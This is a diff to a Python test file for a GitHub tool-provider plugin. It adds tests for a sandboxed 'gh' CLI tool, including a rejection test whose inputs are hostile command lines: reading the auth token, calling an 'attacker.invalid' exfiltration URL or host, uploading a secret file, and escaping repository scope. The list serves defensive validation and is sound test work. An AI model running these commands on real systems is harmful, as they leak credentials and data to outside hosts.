@@ -14,7 +14,9 @@ from collections.abc import Mapping
 from dataclasses import replace
 from typing import Any
 
+import pytest
 from cyrene_account_center_contracts import AuthMaterial, canonical_json
+from cyrene_plugin_runtime.vendor_cli import VendorCliResult
 
 from github_issues_provider._generated import tool_provider_pb2 as wire
 from github_issues_provider.account_center import AccountCenterUnavailable
@@ -68,9 +70,7 @@ class FakeAccountCenter:
             raise AccountCenterUnavailable("lease is already used")
         self.used.add(lease_ref)
         self.calls.append((dict(payload), dict(trusted_context)))
-        return AuthMaterial(
-            "secret-token-must-not-escape", "Bearer", "github-user-42", None
-        )
+        return AuthMaterial("secret-token-must-not-escape", "Bearer", "github-user-42", None)
 
     def redeem_provider_credential_lease(
         self,
@@ -131,6 +131,18 @@ class FakeGitHubApi:
         return {"pull_request": {"number": args[1], "state": "OPEN"}}
 
 
+class FakeCliRunner:
+    """Record the fixed process request and return local-only process evidence."""
+
+    def __init__(self, result: VendorCliResult | None = None) -> None:
+        self.calls: list[dict[str, Any]] = []
+        self.result = result or VendorCliResult(0, 12, False, False, 128, 0)
+
+    def run(self, executable: str, argv: list[str], **kwargs: Any) -> VendorCliResult:
+        self.calls.append({"executable": executable, "argv": list(argv), **kwargs})
+        return self.result
+
+
 def signed_context(
     settings: ProviderSettings,
     arguments: Mapping[str, Any],
@@ -155,7 +167,9 @@ def signed_context(
         "request_id": "request-123",
         "issued_at": int(time.time()),
         "expires_at": int(time.time()) + 60,
-        "operation_id": operation_id,
+        "operation_id": (
+            "github.vendor.cli.execute" if operation_id == "github_vendor_cli" else operation_id
+        ),
     }
     value["signature"] = hmac.new(
         settings.exchange_verification_key,
@@ -222,10 +236,117 @@ def test_catalog_has_exact_tools_and_closed_schemas() -> None:
         "github.pull_request.get",
         "github.actions.runs.list",
         "github.ci.status",
+        "github_vendor_cli",
     ]
     schemas = [json.loads(tool.input_schema_json) for tool in catalog.tools]
     assert all(schema["additionalProperties"] is False for schema in schemas)
     assert schemas[2]["properties"]["state"]["enum"] == ["OPEN", "CLOSED"]
+    assert schemas[-1]["required"] == ["argv"]
+    assert schemas[-1]["additionalProperties"] is False
+
+
+def test_vendor_cli_uses_profile_lease_and_returns_suppressed_receipt() -> None:
+    settings = make_settings()
+    account = FakeAccountCenter()
+    runner = FakeCliRunner()
+    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)
+    arguments = {"argv": ["pr", "list", "--repo", "owner/project"]}
+    profile_ref = "00000000-0000-4000-8000-000000000001"
+
+    is_error, result = invoke_tool(
+        provider,
+        settings,
+        "github_vendor_cli",
+        arguments,
+        profile_ref=profile_ref,
+    )
+
+    assert is_error is False
+    assert result["state"] == "COMMAND_COMPLETED"
+    assert result["remote_state"] == "NOT_APPLICABLE"
+    assert result["stdout_suppressed"] is True
+    assert result["stderr_suppressed"] is True
+    assert "secret-token-must-not-escape" not in json.dumps(result)
+    assert account.calls[0][0] == {
+        "lease_ref": "12345678-1234-1234-1234-123456789abc",
+        "profile_ref": profile_ref,
+        "operation_id": "github.vendor.cli.execute",
+        "target": {},
+        "arguments_sha256": hashlib.sha256(canonical_json(arguments)).hexdigest(),
+    }
+    assert runner.calls[0]["executable"] == "/usr/local/bin/gh"
+    assert runner.calls[0]["argv"] == arguments["argv"]
+    assert runner.calls[0]["credential_environment"] == {
+        "GH_TOKEN": "installation-token-must-not-escape"
+    }
+
+
+def test_vendor_cli_mutation_exit_zero_stays_remote_state_unverified() -> None:
+    settings = make_settings()
+    account = FakeAccountCenter()
+    runner = FakeCliRunner(VendorCliResult(0, 10, False, False, 0, 0))
+    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)
+
+    is_error, result = invoke_tool(
+        provider,
+        settings,
+        "github_vendor_cli",
+        {"argv": ["issue", "close", "7", "--repo", "owner/project"]},
+        profile_ref="00000000-0000-4000-8000-000000000001",
+    )
+
+    assert is_error is False
+    assert result["state"] == "REMOTE_STATE_UNVERIFIED"
+    assert result["command_state"] == "COMMAND_COMPLETED"
+    assert result["remote_state"] == "UNKNOWN_RESULT"
+    assert result["operation_ref"].startswith("ghcli_")
+    assert result["reconciliation_available"] is False
+
+
+@pytest.mark.parametrize(
+    "argv",
+    [
+        ["auth", "token"],
+        ["api", "https://attacker.invalid/exfiltrate"],
+        ["release", "upload", "v1", "./secret.bin"],
+        ["pr", "list", "--repo", "other/private"],
+        ["api", "/user", "--hostname", "attacker.invalid"],
+        ["issue", "create", "--body-file", "/tmp/body.md"],
+    ],
+)
+def test_vendor_cli_rejects_credentials_external_hosts_local_files_and_scope_escape(
+    argv: list[str],
+) -> None:
+    settings = make_settings()
+    account = FakeAccountCenter()
+    runner = FakeCliRunner()
+    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)
+
+    envelope = {
+        "payload": {"argv": argv},
+        "profile_ref": "00000000-0000-4000-8000-000000000001",
+        "lease_ref": "12345678-1234-1234-1234-123456789abc",
+        "trusted_context": signed_context(
+            settings,
+            {"argv": argv},
+            "12345678-1234-1234-1234-123456789abc",
+            "github_vendor_cli",
+            profile_ref="00000000-0000-4000-8000-000000000001",
+        ),
+    }
+    request = wire.CallToolRequest(
+        binding_id=settings.binding_id,
+        provider_tool_id="github_vendor_cli",
+        arguments_json=json.dumps(envelope, separators=(",", ":")),
+    )
+    ok, result = provider.on_invoke(
+        "tool.provider.v1", "call_tool", request.SerializeToString()
+    )
+
+    assert ok is False
+    assert result == "INVALID_ARGUMENTS: tool arguments do not match the schema"
+    assert account.calls == []
+    assert runner.calls == []
 
 
 def test_repository_owner_scope_and_arbitrary_url_are_rejected_before_redeem() -> None:
@@ -484,8 +605,7 @@ def test_issue_comment_webhook_returns_a_deterministic_closed_projection() -> No
         separators=(",", ":"),
     ).encode()
     signature = (
-        "sha256="
-        + hmac.new(settings.github_webhook_secret, raw_body, hashlib.sha256).hexdigest()
+        "sha256=" + hmac.new(settings.github_webhook_secret, raw_body, hashlib.sha256).hexdigest()
     )
 
     def normalize(delivery_id: str) -> dict[str, Any]:
@@ -648,8 +768,7 @@ def test_github_repository_branch_pull_and_ci_reads_use_fixed_allowlisted_paths(
     assert api.get_ci_status(repository, "deadbeef1234567", "token")["state"] == "SUCCESS"
     assert observed.count("/repos/owner/project") == 6
     assert all(
-        path.startswith(("/repos/owner/project", "/installation/repositories"))
-        for path in observed
+        path.startswith(("/repos/owner/project", "/installation/repositories")) for path in observed
     )
 
 
